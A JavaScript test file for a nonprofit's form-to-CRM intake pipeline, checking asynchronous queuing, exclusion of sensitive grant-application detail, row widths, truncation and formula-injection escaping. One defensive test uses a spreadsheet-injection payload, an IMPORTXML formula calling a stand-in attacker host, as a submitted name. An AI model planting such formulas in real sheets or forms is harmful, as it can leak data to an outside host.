// Every public form becomes a person in the CRM, without ever making the
// submitter wait on Google.
//
// The properties pinned here are the ones that fail QUIETLY:
//
//   1. The submission path does not await the sheet. If someone "fixes" this by
//      dropping the queue and appending inline, a Sheets slowdown becomes a
//      spinner on a nonprofit's contact form.
//   2. A grant application's narrative never reaches the CRM. The sheet is
//      shared more widely than GRANTS_INBOX; disability detail and financial
//      need belong in ClickUp behind the review.
//   3. Every KIND's row is exactly as wide as its header. A row one column short
//      silently shifts every value left from that point on, forever.
//   4. Formula injection is neutralised on data that came from a public form.
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { KINDS, queueIntake } from "../src/crm_intake.js";

function fakeRow(over = {}) {
  return {
    id: "11111111-2222-3333-4444-555555555555",
    kind: "contact",
    received_at: "2026-09-04T15:20:31.000Z",
    name: "Dana Reyes", email: "dana@example.org", phone: "555-0100",
    organization: "", source: "Contact form, adapttolife.org", detail: "Partnership",
    clickup_id: "86abc", clickup_url: "https://app.clickup.com/t/86abc",
    payload: JSON.stringify({ message: "We run a clinic in Peoria and would love to talk.", based: "Peoria, IL", time: "A few hours a month" }),
    ...over,
  };
}

test("every kind's row is exactly as wide as its header", () => {
  for (const [name, kind] of Object.entries(KINDS)) {
    const row = kind.row(fakeRow({ kind: name }));
    assert.equal(row.length, kind.headers.length, `${name}: ${row.length} cells for ${kind.headers.length} columns`);
  }
});

test("each kind writes to its own tab, never the curated People tab", () => {
  const tabs = Object.values(KINDS).map((k) => k.tab);
  assert.deepEqual(tabs, ["Contacts", "Applications", "Volunteers"]);
  assert.ok(!tabs.includes("People"), "automation proposes; a person curates People");
  assert.equal(new Set(tabs).size, tabs.length, "two kinds must not share a tab");
});

test("a grant application gives the CRM a name and a link, not the case", () => {
  const row = KINDS.application.row(fakeRow({
    kind: "application",
    payload: JSON.stringify({ location: "Peoria, IL", need: "racing wheelchair", cost: "$4,200", about: "I have a spinal cord injury and..." }),
  }));
  const joined = row.join(" | ");
  for (const secret of ["racing wheelchair", "4,200", "spinal cord"]) {
    assert.ok(!joined.includes(secret), `the Applications tab must not carry "${secret}"`);
  }
  assert.ok(joined.includes("dana@example.org"), "it must still say who applied");
  assert.match(joined, /HYPERLINK\("https:\/\/app\.clickup\.com/, "and link to the case");
});

test("a contact's message is carried but bounded", () => {
  const long = "x".repeat(1000);
  const row = KINDS.contact.row(fakeRow({ payload: JSON.stringify({ message: long }) }));
  const cell = row[KINDS.contact.headers.indexOf("Message")];
  assert.ok(cell.length <= 300, `a CRM cell of ${cell.length} chars is a wall, not a row`);
  assert.ok(cell.endsWith("…"), "truncation should be visible");
});

test("a form submission cannot smuggle a formula into the CRM", () => {
  const row = KINDS.contact.row(fakeRow({ name: '=IMPORTXML("http://evil.test","//a")' }));
  assert.ok(row[KINDS.contact.headers.indexOf("Name")].startsWith("'="));
});

test("a malformed payload degrades to blank cells, it does not throw", () => {
  for (const bad of ["", null, "not json", "[]"]) {
    assert.doesNotThrow(() => KINDS.volunteer.row(fakeRow({ kind: "volunteer", payload: bad })));
  }
});

test("queueIntake never throws into a handler, even with no database", () => {
  assert.doesNotThrow(() => queueIntake({}, null, { kind: "contact", email: "a@b.co" }));
  assert.doesNotThrow(() => queueIntake({ WAIVERS_DB: {} }, null, { kind: "nonsense" }));
});

test("the submission path queues to D1 and does not await the sheet", () => {
  const src = readFileSync(new URL("../src/index.js", import.meta.url), "utf8");
  // queueIntake is sync-by-design and must never be awaited on a request path.
  assert.ok(!/await\s+queueIntake/.test(src), "awaiting the queue puts D1 on the response path");
  assert.equal((src.match(/queueIntake\(/g) || []).length, 3, "contact, application and volunteer");
  // The sheet is only ever touched from the scheduled handler.
  const intake = readFileSync(new URL("../src/crm_intake.js", import.meta.url), "utf8");
  assert.match(intake, /export async function runCrmIntakeSync/);
  assert.ok(!/appendRow/.test(src), "src/index.js must not append to a sheet directly");
});

test("the intake table is created by a migration that can be re-run", () => {
  const sql = readFileSync(new URL("../schema/migrations/2026-09-04-crm-intake.sql", import.meta.url), "utf8");
  assert.match(sql, /CREATE TABLE IF NOT EXISTS crm_intake/);
  for (const col of ["kind", "crm_synced_at", "crm_error", "clickup_url", "payload"]) {
    assert.ok(sql.includes(col), `crm_intake needs ${col}`);
  }
});
